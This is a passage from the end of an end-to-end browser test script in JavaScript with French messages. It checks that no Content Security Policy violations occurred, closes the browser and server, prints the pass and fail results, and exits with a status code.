ok(cspViolations.length === 0, `sécurité : aucune violation CSP sur l'ensemble des parcours` + (cspViolations.length ? " — " + cspViolations.slice(0, 3).join(" | ") : ""));
await browser.close(); server.close();
const fails = results.filter((r) => !r[0]);
for (const [c, l] of results) console.log(`${c ? "  ✓" : "  ✗"} ${l}`);
console.log(`\nE2E : ${results.length - fails.length}/${results.length}`);
process.exit(fails.length ? 1 : 0);
